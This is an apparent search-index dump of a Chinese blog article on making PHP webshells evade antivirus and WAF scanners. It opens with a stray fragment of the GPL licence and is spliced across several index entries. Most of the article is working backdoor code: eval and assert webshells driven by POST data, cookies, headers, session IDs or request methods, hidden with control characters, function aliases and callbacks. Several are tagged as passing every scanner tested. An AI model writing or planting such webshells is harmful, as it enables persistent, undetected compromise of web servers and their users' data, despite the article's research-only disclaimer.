Corresponding Source need not include anything that users can regenerate automatically from other parts of the Corresponding Source. The Corresponding Source for a work in source code form is that same work. 2. Basic Permissions. All rights granted under this License are granted for the term of copyright on the Program, and are irrevocable provided the stated conditions are met. This License explicitly affirms your unlimited permission to run the unmodified Program. The output from running a covered work is covered by this License only if the output, given its content, constitutes a covered work. This License acknowledges your rights of fair use or other equivalent, as provided by copyright law. You may make, run and propagate covered works that you do not convey, without conditions so long as your license otherwise remains in force. You may convey covered works to others for the sole purpose of having them make modifications exclusively for you, or provide you with facilities for running those works, provided that you comply with the terms of this License in conveying all material for which you do not control copyright. Those thus making or running the covered works for you must do so exclusively on your behalf, under your direction and control, on terms that prohibit them from making any copies of your copyrighted material outside their relationship with you. Conveying under any other circumstances is permitted solely under the conditions stated below. Sublicensing is not allowed; section 10 makes it unnecessary. */ ?> \u4e5f\u8bb8\u4e0a\u9762\u7684\u65b9\u6cd5\u53ea\u4f7f\u7528\u4e00\u79cd\u7684\u8bdd\u65e0\u6cd5\u8fbe\u5230\u514d\u6740\u7684\u76ee\u7684,\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u5d4c\u5957\u4f7f\u7528,\u5982\u5b9a\u4e49\u4e00\u4e2a\u51fd\u6570/\u7c7b,\u5728\u91cc\u9762\u8fdb\u884c\u8c03\u7528 <?php // copy from https://xz.aliyun.com/t/5152 function test ( $a , $b ){ array_map ( $a , $b ); } test ( assert , array ( $_POST [ 'x' ])); ?> <?php // copy from https://xz.aliyun.com/t/5152 class loveme { var $a ; var $b ; function __construct ( $a , $b ) { $this -> a = $a ; $this -> b = $b ; } function test () { array_map ( $this -> a , $this -> b ); } } $p1 = new loveme ( assert , array ( $_POST [ 'x' ])); $p1 -> test (); ?> \u7b26\u53f7\u5e72\u6270 # \u8fd9\u79cd\u65b9\u6cd5\u901a\u5e38\u7528\u4e8e\u5e72\u6270\u67e5\u6740\u7684\u6b63\u5219\u5224\u65ad,\u53ef\u4ee5\u4f7f\u7528\u7684\u7b26\u53f7\u6709null,\\n,\\r,\\t\u7b49 \u5e38\u7528\u7684\u65b9\u5f0f\u662f\u5c06\u8fd9\u4e9b\u5b57\u7b26\u4e0e\u5b57\u7b26\u4e32\u8fdb\u884c\u62fc\u63a5,\u5982\u679c\u4f60\u7684webshell\u88ab\u6740\u4e86,\u53ef\u4ee5\u5c1d\u8bd5\u4e00\u4e0b, \u5982: <?php // copy from https://xz.aliyun.com/t/5152 $a = $_REQUEST [ 'a' ]; $b = null ; eval ( $b . $a ); ?> <?php // copy from https://xz.aliyun.com/t/5152 $a = $_POST [ 'a' ]; $b = \" \\n \" ; eval ( $b .= $a ); ?> \u8fd8\u6709\u4e00\u79cd\u6bd4\u8f83\u9a9a\u7684\u59ff\u52bf\u5728\u51fd\u6570\u8c03\u7528\u4e2d\u662f\u63d2\u5165\u4e00\u4e9b\u63a7\u5236\u7b26 [\\x00-\\x20] ,PHP\u5f15\u64ce\u4f1a\u5ffd\u7565\u8fd9\u4e9b\u63a7\u5236\u5b57\u7b26,\u6b63\u786e\u6267\u884cPHP\u51fd\u6570,\u5982: <?php // copy from https://bbs.symbo1.com/t/topic/94 eval \\x01\\x02 ( $_POST [ 2333 ]); //\u8fd9\u91cc\\x01\u4e0e\\x02\u8981\u8f6c\u6362\u4e3a\u5b9e\u9645\u7684\u5b57\u7b26 \u522b\u540d/\u91cd\u547d\u540d # \u5176\u5b9ePHP\u4e2d\u662f\u6709\u5f88\u591a\u51fd\u6570\u522b\u540d\u7684,\u5982pos\u662fcurrent\u7684\u522b\u540d,\u5728PHP5.6\u52a0\u5165\u4e86\u51fd\u6570\u540d\u7684\u547d\u540d\u7a7a\u95f4\u4e4b\u540e\u6211\u4eec\u751a\u81f3\u53ef\u4ee5\u81ea\u5df1\u521b\u9020\"\u522b\u540d\". \u8fd9\u91cc\u9644\u4e00\u4e2aPHP7.4.3\u4e2d\u51fd\u6570\u522b\u540d\u8868(\u4e2a\u4eba\u6574\u7406,\u53ef\u80fd\u4f1a\u6709\u9519/\u6f0f) bzwrite->fwrite bzflush->fflush bzclose->fclose isId->dom_attr_is_id substringData->dom_characterdata_substring_data appendData->dom_characterdata_append_data insertData->dom_characterdata_insert_data deleteData->dom_characterdata_delete_data replaceData->dom_characterdata_replace_data createElement->dom_document_create_element createDocumentFragment->dom_document_create_document_fragment createTextNode->dom_document_create_text_node createComment->dom_document_create_comment createCDATASection->dom_document_create_cdatasection createProcessingInstruction->dom_document_create_processing_instruction createAttribute->dom_document_create_attribute createEntityReference->dom_document_create_entity_reference getElementsByTagName->dom_document_get_elements_by_tag_name importNode->dom_document_import_node createElementNS->dom_document_create_element_ns createAttributeNS->dom_document_create_attribute_ns getElementsByTagNameNS->dom_document_get_elements_by_tag_name_ns getElementById->dom_document_get_element_by_id adoptNode->dom_document_adopt_node normalizeDocument->dom_document_normalize_document renameNode->dom_document_rename_node save->dom_document_save saveXML->dom_document_savexml validate->dom_document_validate xinclude->dom_document_xinclude saveHTML->dom_document_save_html saveHTMLFile->dom_document_save_html_file schemaValidate->dom_document_schema_validate_file schemaValidateSource->dom_document_schema_validate_xml relaxNGValidate->dom_document_relaxNG_validate_file relaxNGValidateSource->dom_document_relaxNG_validate_xml setParameter->dom_domconfiguration_set_parameter getParameter->dom_domconfiguration_get_parameter canSetParameter->dom_domconfiguration_can_set_parameter handleError->dom_domerrorhandler_handle_error item->dom_domimplementationlist_item getDomimplementation->dom_domimplementationsource_get_domimplementation getDomimplementations->dom_domimplementationsource_get_domimplementations item->dom_domstringlist_item getAttribute->dom_element_get_attribute setAttribute->dom_element_set_attribute removeAttribute->dom_element_remove_attribute getAttributeNode->dom_element_get_attribute_node setAttributeNode->dom_element_set_attribute_node removeAttributeNode->dom_element_remove_attribute_node getElementsByTagName->dom_element_get_elements_by_tag_name getAttributeNS->dom_element_get_attribute_ns setAttributeNS->dom_element_set_attribute_ns removeAttributeNS->dom_element_remove_attribute_ns getAttributeNodeNS->dom_element_get_attribute_node_ns setAttributeNodeNS->dom_element_set_attribute_node_ns getElementsByTagNameNS->dom_element_get_elements_by_tag_name_ns hasAttribute->dom_element_has_attribute hasAttributeNS->dom_element_has_attribute_ns setIdAttribute->dom_element_set_id_attribute setIdAttributeNS->dom_element_set_id_attribute_ns setIdAttributeNode->dom_element_set_id_attribute_node getNamedItem->dom_namednodemap_get_named_item setNamedItem->dom_namednodemap_set_named_item removeNamedItem->dom_namednodemap_remove_named_item item->dom_namednodemap_item getNamedItemNS->dom_namednodemap_get_named_item_ns setNamedItemNS->dom_namednodemap_set_named_item_ns removeNamedItemNS->dom_namednodemap_remove_named_item_ns count->dom_namednodemap_count getName->dom_namelist_get_name getNamespaceURI->dom_namelist_get_namespace_uri insertBefore->dom_node_insert_before replaceChild->dom_node_replace_child removeChild->dom_node_remove_child appendChild->dom_node_append_child hasChildNodes->dom_node_has_child_nodes cloneNode->dom_node_clone_node normalize->dom_node_normalize isSupported->dom_node_is_supported hasAttributes->dom_node_has_attributes compareDocumentPosition->dom_node_compare_document_position isSameNode->dom_node_is_same_node lookupPrefix->dom_node_lookup_prefix isDefaultNamespace->dom_node_is_default_namespace lookupNamespaceUri->dom_node_lookup_namespace_uri isEqualNode->dom_node_is_equal_node getFeature->dom_node_get_feature setUserData->dom_node_set_user_data getUserData->dom_node_get_user_data item->dom_nodelist_item count->dom_nodelist_count findOffset16->dom_string_extend_find_offset16 findOffset32->dom_string_extend_find_offset32 splitText->dom_text_split_text isWhitespaceInElementContent->dom_text_is_whitespace_in_element_content isElementContentWhitespace->dom_text_is_whitespace_in_element_content replaceWholeText->dom_text_replace_whole_text handle->dom_userdatahandler_handle registerNamespace->dom_xpath_register_ns query->dom_xpath_query evaluate->dom_xpath_evaluate registerPhpFunctions->dom_xpath_register_php_functions ftp_quit->ftp_close imap_header->imap_headerinfo imap_listmailbox->imap_list imap_getmailboxes->imap_list_full imap_scanmailbox->imap_listscan imap_listsubscribed->imap_lsub imap_getsubscribed->imap_lsub_full imap_fetchtext->imap_body imap_scan->imap_listscan imap_create->imap_createmailbox imap_rename->imap_renamemailbox ldap_close->ldap_unbind ldap_get_values->ldap_get_values_len ldap_modify->ldap_mod_replace mysqli_execute->mysqli_stmt_execute mysqli_escape_string->mysqli_real_escape_string mysqli_set_opt->mysqli_options autocommit->mysqli_autocommit begin_transaction->mysqli_begin_transaction change_user->mysqli_change_user character_set_name->mysqli_character_set_name close->mysqli_close commit->mysqli_commit connect->mysqli_connect dump_debug_info->mysqli_dump_debug_info debug->mysqli_debug get_charset->mysqli_get_charset get_client_info->mysqli_get_client_info get_client_info->mysqli_get_client_info get_connection_stats->mysqli_get_connection_stats get_server_info->mysqli_get_server_info get_warnings->mysqli_get_warnings init->mysqli_init_method kill->mysqli_kill multi_query->mysqli_multi_query construct->mysqli_link_construct more_results->mysqli_more_results next_result->mysqli_next_result options->mysqli_options ping->mysqli_ping prepare->mysqli_prepare query->mysqli_query real_connect->mysqli_real_connect real_escape_string->mysqli_real_escape_string escape_string->mysqli_real_escape_string real_query->mysqli_real_query release_savepoint->mysqli_release_savepoint rollback->mysqli_rollback savepoint->mysqli_savepoint select_db->mysqli_select_db set_charset->mysqli_set_charset set_opt->mysqli_options ssl_set->mysqli_ssl_set stat->mysqli_stat stmt_init->mysqli_stmt_init store_result->mysqli_store_result thread_safe->mysqli_thread_safe use_result->mysqli_use_result refresh->mysqli_refresh construct->mysqli_result_construct close->mysqli_free_result free->mysqli_free_result data_seek->mysqli_data_seek fetch_field->mysqli_fetch_field fetch_fields->mysqli_fetch_fields fetch_field_direct->mysqli_fetch_field_direct fetch_all->mysqli_fetch_all fetch_array->mysqli_fetch_array fetch_assoc->mysqli_fetch_assoc fetch_object->mysqli_fetch_object fetch_row->mysqli_fetch_row field_seek->mysqli_field_seek free_result->mysqli_free_result construct->mysqli_stmt_construct attr_get->mysqli_stmt_attr_get attr_set->mysqli_stmt_attr_set bind_param->mysqli_stmt_bind_param bind_result->mysqli_stmt_bind_result close->mysqli_stmt_close data_seek->mysqli_stmt_data_seek execute->mysqli_stmt_execute fetch->mysqli_stmt_fetch get_warnings->mysqli_stmt_get_warnings result_metadata->mysqli_stmt_result_metadata more_results->mysqli_stmt_more_results next_result->mysqli_stmt_next_result num_rows->mysqli_stmt_num_rows send_long_data->mysqli_stmt_send_long_data free_result->mysqli_stmt_free_result reset->mysqli_stmt_reset prepare->mysqli_stmt_prepare store_result->mysqli_stmt_store_result get_result->mysqli_stmt_get_result oci_free_cursor->oci_free_statement ocifreecursor->oci_free_statement ocibindbyname->oci_bind_by_name ocidefinebyname->oci_define_by_name ocicolumnisnull->oci_field_is_null ocicolumnname->oci_field_name ocicolumnsize->oci_field_size ocicolumnscale->oci_field_scale ocicolumnprecision->oci_field_precision ocicolumntype->oci_field_type ocicolumntyperaw->oci_field_type_raw ociexecute->oci_execute ocicancel->oci_cancel ocifetch->oci_fetch ocifetchstatement->oci_fetch_all ocifreestatement->oci_free_statement ociinternaldebug->oci_internal_debug ocinumcols->oci_num_fields ociparse->oci_parse ocinewcursor->oci_new_cursor ociresult->oci_result ociserverversion->oci_server_version ocistatementtype->oci_statement_type ocirowcount->oci_num_rows ocilogoff->oci_close ocilogon->oci_connect ocinlogon->oci_new_connect ociplogon->oci_pconnect ocierror->oci_error ocifreedesc->oci_free_descriptor ocisavelob->oci_lob_save ocisavelobfile->oci_lob_import ociwritelobtofile->oci_lob_export ociloadlob->oci_lob_load ocicommit->oci_commit ocirollback->oci_rollback ocinewdescriptor->oci_new_descriptor ocisetprefetch->oci_set_prefetch ocipasswordchange->oci_password_change ocifreecollection->oci_free_collection ocinewcollection->oci_new_collection ocicollappend->oci_collection_append ocicollgetelem->oci_collection_element_get ocicollassignelem->oci_collection_element_assign ocicollsize->oci_collection_size ocicollmax->oci_collection_max ocicolltrim->oci_collection_trim load->oci_lob_load tell->oci_lob_tell truncate->oci_lob_truncate erase->oci_lob_erase flush->oci_lob_flush setbuffering->ocisetbufferinglob getbuffering->ocigetbufferinglob rewind->oci_lob_rewind read->oci_lob_read eof->oci_lob_eof seek->oci_lob_seek write->oci_lob_write append->oci_lob_append size->oci_lob_size writetofile->oci_lob_export export->oci_lob_export import->oci_lob_import writetemporary->oci_lob_write_temporary close->oci_lob_close save->oci_lob_save savefile->oci_lob_import free->oci_free_descriptor append->oci_collection_append getelem->oci_collection_element_get assignelem->oci_collection_element_assign assign->oci_collection_assign size->oci_collection_size max->oci_collection_max trim->oci_collection_trim free->oci_free_collection odbc_do->odbc_exec odbc_field_precision->odbc_field_len openssl_free_key->openssl_pkey_free openssl_get_privatekey->openssl_pkey_get_private openssl_get_publickey->openssl_pkey_get_public pcntl_errno->pcntl_get_last_error pg_exec->pg_query pg_getlastoid->pg_last_oid pg_cmdtuples->pg_affected_rows pg_errormessage->pg_last_error pg_numrows->pg_num_rows pg_numfields->pg_num_fields pg_fieldname->pg_field_name pg_fieldsize->pg_field_size pg_fieldtype->pg_field_type pg_fieldnum->pg_field_num pg_fieldprtlen->pg_field_prtlen pg_fieldisnull->pg_field_is_null pg_freeresult->pg_free_result pg_result->pg_fetch_result pg_loreadall->pg_lo_read_all pg_locreate->pg_lo_create pg_lounlink->pg_lo_unlink pg_loopen->pg_lo_open pg_loclose->pg_lo_close pg_loread->pg_lo_read pg_lowrite->pg_lo_write pg_loimport->pg_lo_import pg_loexport->pg_lo_export pg_clientencoding->pg_client_encoding pg_setclientencoding->pg_set_client_encoding pg_clientencoding->pg_client_encoding pg_setclientencoding->pg_set_client_encoding posix_errno->posix_get_last_error session_commit->session_write_close snmpwalkoid->snmprealwalk snmp_set_oid_numeric_print->snmp_set_oid_output_format socket_getopt->socket_get_option socket_setopt->socket_set_option sodium_crypto_scalarmult_base->sodium_crypto_box_publickey_from_secretkey join->implode chop->rtrim strchr->strstr srand->mt_srand getrandmax->mt_getrandmax show_source->highlight_file ini_alter->ini_set checkdnsrr->dns_check_record getmxrr->dns_get_mx doubleval->floatval is_integer->is_int is_long->is_int is_double->is_float fputs->fwrite set_file_buffer->stream_set_write_buffer socket_set_blocking->stream_set_blocking stream_register_wrapper->stream_wrapper_register stream_register_wrapper->stream_wrapper_register socket_set_timeout->stream_set_timeout dir->getdir is_writeable->is_writable diskfreespace->disk_free_space pos->current sizeof->count key_exists->array_key_exists close->closedir rewind->rewinddir importStylesheet->xsl_xsltprocessor_import_stylesheet transformToDoc->xsl_xsltprocessor_transform_to_doc transformToUri->xsl_xsltprocessor_transform_to_uri transformToXml->xsl_xsltprocessor_transform_to_xml setParameter->xsl_xsltprocessor_set_parameter getParameter->xsl_xsltprocessor_get_parameter removeParameter->xsl_xsltprocessor_remove_parameter hasExsltSupport->xsl_xsltprocessor_has_exslt_support registerPHPFunctions->xsl_xsltprocessor_register_php_functions setProfiling->xsl_xsltprocessor_set_profiling setSecurityPrefs->xsl_xsltprocessor_set_security_prefs getSecurityPrefs->xsl_xsltprocessor_get_security_prefs gzrewind->rewind gzclose->fclose gzeof->feof gzgetc->fgetc gzgets->fgets DEP_FALIAS(gzgetss->fgetss gzread->fread gzpassthru->fpassthru gzseek->fseek gztell->ftell gzwrite->fwrite gzputs->fwrite getallheaders->apache_request_headers getallheaders->litespeed_request_headers apache_request_headers->litespeed_request_headers apache_response_headers->litespeed_response_headers \u8fd9\u91cc\u9644\u7684\u8868\u4e0d\u5305\u542b\u88ab\u5f03\u7528\u7684(\u4f1a\u6709PHP\u8b66\u544a,\u4f46\u4ecd\u53ef\u7528),\u800c\u5728\u8fd9\u4e9b\u522b\u540d\u4e2d,\u6211\u4eec\u5c31\u53ef\u4ee5\u627e\u5230\u53ef\u4ee5\u5229\u7528\u7684\u51fd\u6570mbereg replace,\u8fd9\u4e2a\u51fd\u6570\u662fmb ereg replace\u7684\u522b\u540d,mb ereg replace\u4e0epreg replace\u7c7b\u4f3c,\u53ef\u4ee5\u5229\u7528e\u6a21\u5f0f\u9690\u5f0f\u6267\u884c\u4ee3\u7801,\u4f46\u662fmb ereg replace\u65e0\u6cd5\u9003\u8fc7\u67e5\u6740,\u800cmbereg replace\u5219\u662fALLKILL,\u6ca1\u9519,\u53ea\u662f\u4e00\u4e2a \u7684\u5dee\u522b,\u8ba9\u4ed6\u9003\u8fc7\u4e86\u514d\u6740\u7684\u773c\u775b <?php // (ALLKILL) error_reporting ( 0 ); mbereg_replace ( '.*' , '\\0' , $_REQUEST [ 2333 ], 'mer' ); //php5 php7 success ?> \u53e6\u5916,\u6211\u4eec\u53ef\u4ee5\u81ea\u5df1\u521b\u9020\u522b\u540d,\u5982: <?php // PHP >=5.6 \u53ef\u8fc7\u76fe\u72d7 use function \\system as strlen ; // \u914d\u5408\u6587\u4ef6\u5305\u542b\u8fd9\u751a\u81f3\u53ef\u4ee5\u5b9e\u73b0\u52ab\u6301,\u7559\u5f85\u4f60\u4eec\u5f00\u53d1 strlen ( $_POST [ 1 ]); <?php // (ALLKILL) define ( \"ARRAY2\" , \"sys\" . \"tem\" ); @ constant ( \"ARRAY2\" )( pos ( pos ( $GLOBALS ))); // PHP>7 \u514d\u8d23\u58f0\u660e: \u5728\u5bf9\u65b9\u672a\u6388\u6743\u7684\u60c5\u51b5\u4e0b\uff0c\u76f4\u63a5\u6216\u95f4\u63a5\u5229\u7528\u672c\u9879\u76ee\u6d89\u53ca\u5230\u7684 webshell \u7814\u7a76\u6837\u672c\u653b\u51fb\u76ee\u6807\u662f\u8fdd\u6cd5\u884c\u4e3a. \u672c\u9879\u76ee\u6d89\u53ca\u5230\u7684 webshell \u4ec5\u4e3a\u5b89\u5168\u7814\u7a76\u548c\u6388\u6743\u60c5\u51b5\u4e0b\u4f7f\u7528\uff0c\u5176\u4f7f\u7528\u4eba\u5458\u6709\u8d23\u4efb\u548c\u4e49\u52a1\u9075\u5b88\u5f53\u5730\u6cd5\u5f8b\u6761\u89c4. \u672c\u9879\u76ee\u6d89\u53ca\u5230\u7684 webshell \u6837\u672c\u53ca\u6587\u7ae0\u4ec5\u4e3a\u4fc3\u8fdb\u5b89\u5168\u9632\u5fa1\u7814\u7a76\u4f7f\u7528\uff0c\u7814\u7a76\u4eba\u5458\u5bf9\u56e0\u8bef\u7528\u8be5\u7a0b\u5e8f\u9020\u6210\u7684\u8d44\u4ea7\u635f\u574f\u548c\u635f\u5931\u6982\u4e0d\u8d1f\u8d23.","title":"webshell\u514d\u6740\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/webshell%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/#webshell\u514d\u6740\u603b\u7ed3","text":"\u4ee5\u4e0b\u5185\u5bb9\u57fa\u4e8ePHP7 \u6700\u8fd1\u5bf9webshell\u7684\u514d\u6740\u673a\u5236\u4ea7\u751f\u4e86\u6d53\u539a\u7684\u5174\u8da3,\u4e8e\u662f\u5f00\u59cb\u8fdb\u884c\u7814\u7a76,\u53c2\u8003\u4e86\u7f51\u4e0a\u8bb8\u8bb8\u591a\u591a\u7684\u6587\u7ae0,\u4ee5\u4e0b\u662f\u6211\u5bf9webshell\u514d\u6740\u7684\u4e00\u4e9b\u603b\u7ed3 \u4f7f\u7528\u4ee5\u4e0b\u7f51\u7ad9\u53ca\u514d\u6740\u5de5\u5177\u8fdb\u884c\u514d\u6740\u6d4b\u8bd5(\u5e26\u661f\u53f7\u7684\u8868\u793a\u6211\u8ba4\u4e3a\u68c0\u6d4b\u6548\u679c\u6bd4\u8f83\u597d\u7684\u5de5\u5177/\u7f51\u7ad9): webshellchop \u957f\u4ead(*) \u6df1\u5ea6\u5b66\u4e60 WEBDIR+ \u767e\u5ea6(*) \u6cb3\u9a6c\u5728\u7ebf\u67e5\u6740 D\u76fe \u5b89\u5168\u72d7 \u53c2\u8003\u6587\u7ae0: https://www.freebuf.com/articles/web/155891.html https://bbs.symbo1.com/t/topic/94 https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html https://xz.aliyun.com/t/5152 http://webshell.cdxy.me/ \u4e0b\u7684\u8bc4\u8bba ...","title":"webshell\u514d\u6740\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/webshell%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/#\u514d\u6740\u6280\u672f\u57fa\u7840","text":"","title":"\u514d\u6740\u6280\u672f\u57fa\u7840"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/webshell%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/#\u524d\u8a00","text":"\u5bf9\u4e8ewebshell\u7684\u514d\u6740\u800c\u8a00,PHP5\u4e0ePHP7\u6709\u5f88\u5927\u7684\u4e0d\u540c,\u5728PHP7\u4e4b\u540e,assert\u8fd9\u4e2a\u9a6c\u513f\u5e38\u7528\u7684\u51fd\u6570\u53d8\u6210\u4e86\u4e00\u79cd\u7c7b\u4f3c\u4e8eeval\u7684\u8bed\u6cd5\u6784\u9020,\u8fd9\u4f7f\u5f97\u6211\u4eec\u65e0\u6cd5\u901a\u8fc7\u52a8\u6001\u51fd\u6570\u7684\u65b9\u5f0f\u6765\u8c03\u7528assert,\u8fd9\u65e0\u7591\u662f\u5bf9\u514d\u6740\u7684\u4e00\u6b21\u6c89\u91cd\u6253\u51fb.(\u7ecf\u8fc7\u4e25\u683c\u6d4b\u8bd5,\u5728PHP7.0.33\u4e2d\u4f9d\u7136\u53ef\u4ee5,\u731c\u6d4b\u5e94\u8be5\u662fPHP7.1\u4ee5\u540e),\u56e0\u6b64\u6211\u4eec\u9700\u8981\u8f6c\u53d8\u601d\u8def\u4e86.\u6807\u6709(ALLKILL)\u5b57\u6837\u7684webshell\u901a\u8fc7\u4e86\u672c\u6587\u63d0\u5230\u7684\u6240\u6709\u67e5\u6740","title":"\u524d\u8a00"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/webshell%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/#\u53e6\u7c7b\u7684\u5165\u53e3","text":"\u6211\u4eec\u5e38\u89c1\u7684webshell\u5165\u53e3\u90fd\u662f GET, POST\u4e4b\u7c7b\u7684,\u4f46\u662f\u5176\u5b9e\u4e00\u5207\u7684\u5165\u53e3\u6211\u4eec\u90fd\u53ef\u4ee5\u8fdb\u884c\u5229\u7528,\u4ee5\u6b64\u6765\u9003\u8fc7\u67e5\u6740: $_GET $_POST $_COOKIE $_REQUEST $_SERVER \u5176\u4e2d\u7684\u67d0\u4e9b\u53c2\u6570\u53ef\u63a7,\u5982REQUEST METHOD,QUERY STRING,HTTP USER AGENT\u7b49 session_id() \u8fd9\u4e2a\u6bd4\u8f83\u7279\u6b8a,\u4f46\u662f\u4f9d\u7136\u53ef\u4ee5\u5229\u7528 $_FILE $GLOBALS getallheaders() get defined vars() get defined functions() \u4e0b\u9762\u4e3e\u51e0\u4e2a\u4f8b\u5b50: <?php @ eval ( urldecode ( $_FILES [ 'file' ][ 'name' ])); // \u8be5\u9a6c\u4f1a\u628a\u53cc\u5f15\u53f7\u7ed9URL\u7f16\u7801, // \u56e0\u6b64\u5982\u679cpayload\u4e2d\u6709\u53cc\u5f15\u53f7\u5219\u9700\u8981\u5957\u4e00\u5c42urldecode @ eval ( urldecode ( $_FILES [ 'file' ][ 'type' ])); // \u8be5p\u9a6c\u4f1a\u628a\u5206\u53f7\u5403\u6389,\u56e0\u6b64\u9700\u8981\u5bf9\u5206\u53f7\u8fdb\u884c\u7f16\u7801\u5982URL\u7f16\u7801(%3B) //\u56e0\u6b64\u9700\u8981\u5957\u4e00\u5c42urldecode ?> <?php @ eval ( hex2bin ( $_SERVER [ 'REQUEST_METHOD' ])); // \u8be5\u9a6c\u901a\u8fc7\u8bbe\u7f6e\u8bf7\u6c42\u65b9\u5f0f\u6765\u5b9e\u73b0\u6267\u884c,\u7531\u4e8e\u7b26\u53f7\u95ee\u9898 // \u9700\u8981\u7528bin2hex\u5bf9payload\u8fdb\u884c\u7f16\u7801 ?> <?php $a = $_SERVER [ 'QUERY_STRING' ]; //\u4f8b\u5b50 ?php=info()& $a = str_replace ( \"&\" , \";\" , $a ); $a = str_replace ( \"=\" , \"\" , $a ); @ eval ( $a ); ?> <?php @ eval ( getallheaders ()[ 'Referer' ]); <?php // (ALLKILL) error_reporting ( 0 ); eval ( null . implode ( reset ( get_defined_vars ()))); // php>=5.5 ?a=echo 1; ?> <?php // (ALLKILL) error_reporting ( 0 ); define ( \"SS\" , \"session_start\" ); function result ( $arg ) { return 1 > 0 ? @ $arg : 0 ; } function hex22bin ( $data ) { $len = strlen ( $data ); return pack ( \"H\" . $len , $data ); } class deal { function combine_var ( $default = NULL ){ if ( ! constant ( \"SS\" )) { return $default ; } if ( ! preg_match ( '/\\w+/' , $this -> sess )) { throw new Exception ( \" $this->sess error\" ); } $results = null ; //trash $results = result ( $this -> sess ); @ eval ( \" $this->sess \" ); // PHP>=5.4 // Cookie: PHPSESSID=706870696e666f28293b == phpinfo(); hex2bin(\"phpinfo();\") => 706870696e666f28293b } function __construct ( $arg ){ $this -> sess = $arg ; return $this -> combine_var (); } } $son = constant ( \"SS\" ); $son (); $sessionid = session_id (); $sessionid = hex22bin ( $sessionid ); $deals = new deal ( $sessionid ); ?> \u5176\u4e2d\u6bd4\u8f83\u503c\u5f97\u6ce8\u610f\u7684\u662fGLOBALS,get defined vars(),getallheaders() GLOBALS,get defined vars(): \u4e00\u4e2a\u662f\u8d85\u5168\u5c40\u53d8\u91cf,\u4e00\u4e2a\u662f\u51fd\u6570,\u8fd4\u56de\u503c\u90fd\u662f\u4e00\u4e2a\u591a\u7ef4\u6570\u7ec4,\u5305\u542b\u4e86 GET, POST\u7b49\u5176\u4ed6\u8d85\u5168\u5c40\u53d8\u91cf,\u53ef\u4ee5\u501f\u6b64\u6765\u5bf9\u88f8\u9732\u7684\u8f93\u5165\u8fdb\u884c\u5d4c\u5957,\u5982\u7528GLOBALS[' POST'][1]\u4ee3\u66ff POST[1] getallheaders(): \u83b7\u53d6\u6240\u6709\u7684\u8bf7\u6c42\u5934(\u8be5\u51fd\u6570\u62e5\u6709\u4e00\u4e9b\u9650\u5236,\u5177\u4f53\u8bf7\u53c2\u7167 \u8fd9\u91cc ) \u540c\u6837\u53ef\u4ee5\u501f\u6b64\u6765\u5c1d\u8bd5\u9003\u8fc7\u5bf9\u8f93\u5165\u7684\u68c0\u67e5 \u8fd9\u91cc\u518d\u8bf4\u51e0\u4e2aPHP\u7684\u51fd\u6570 pos(),current(),reset():\u8fd9\u4e09\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u503c\u90fd\u662f\u4f20\u5165\u6570\u7ec4\u7684\u4e00\u4e2a\u5143\u7d20 next():\u8fd9\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u503c\u662f\u4f20\u5165\u6570\u7ec4\u7684\u7b2c\u4e8c\u4e2a\u5143\u7d20 end():\u8fd9\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u503c\u662f\u4f20\u5165\u6570\u7ec4\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20 implode():\u53ef\u4ee5\u5c06\u6570\u7ec4\u4e2d\u7684\u5143\u7d20\u62fc\u63a5\u8d77\u6765,\u5982\u62fc\u63a5\u6210\u5b57\u7b26\u4e32 \u53ef\u4ee5\u770b\u5230 evil5.php \u4e2d\u6211\u4eec\u4ec5\u4ec5\u5bf9\u8f93\u5165\u8fdb\u884c\u5904\u7406,\u62fc\u63a5null\u5c31\u8eb2\u8fc7\u4e86\u6240\u6709\u7684\u67e5\u6740. \u9664\u4e86\u4e0a\u8ff0\u65b9\u6cd5\u4e4b\u5916,\u6211\u4eec\u4e5f\u53ef\u4ee5\u5c1d\u8bd5\u4ece\u4e0d\u540c\u7684\"\u95e8\"\u8fdb\u5165,\u5982\u6267\u884c\u7cfb\u7edf\u547d\u4ee4: system() exec() shell_exec() passthru() proc_open() \u53cd\u5f15\u53f7\u6267\u884c\u7cfb\u7edf\u547d\u4ee4 \u6216\u8005\u4f7f\u7528\u4e00\u4e9b\u533f\u540d\u51fd\u6570,\u52a8\u6001\u8c03\u7528\u51fd\u6570,\u56de\u8c03\u51fd\u6570: call user func call user func_array array_filter array_map uasort, uksort array_reduce array_udiff array_walk array walk recursive preg replace, mb ereg_replace preg_filter register shutdown function register tick function filter_var filter var array \u7c7b\u7684\u53cd\u5c04->invoke() include file get contents create function // \u6211\u5c1d\u8bd5\u7528create function\u6765\u521b\u9020\u514d\u6740webshell,\u4f46\u4f3c\u4e4e\u603b\u662f\u7ed5\u4e0d\u8fc7\u957f\u4ead <?php // (ALLKILL) error_reporting ( 0 ); function compare_by_area ( $a , $b ) { $areaA = substr ( $a -> width . $a -> height , 4 ); $areaB = substr ( $b -> width . $b -> height , 4 ); if ( $areaA ( $areaB )) { return - 1 ; } elseif ( $areaA == $areaB ) { return 1 ; } else { return 0 ; } } $array1 = array ( new stdclass ); $array1 [ 0 ] -> width = 'code' ; $array1 [ 0 ] -> height = 'sys' . 'tem' ; $array2 = array ( new stdclass ); $array2 [ 0 ] -> width = 'args' ; $array2 [ 0 ] -> height = pos ( next ( $GLOBALS )); array_udiff ( $array1 , $array2 , 'compare_by_area' ); // PHP >=5.3 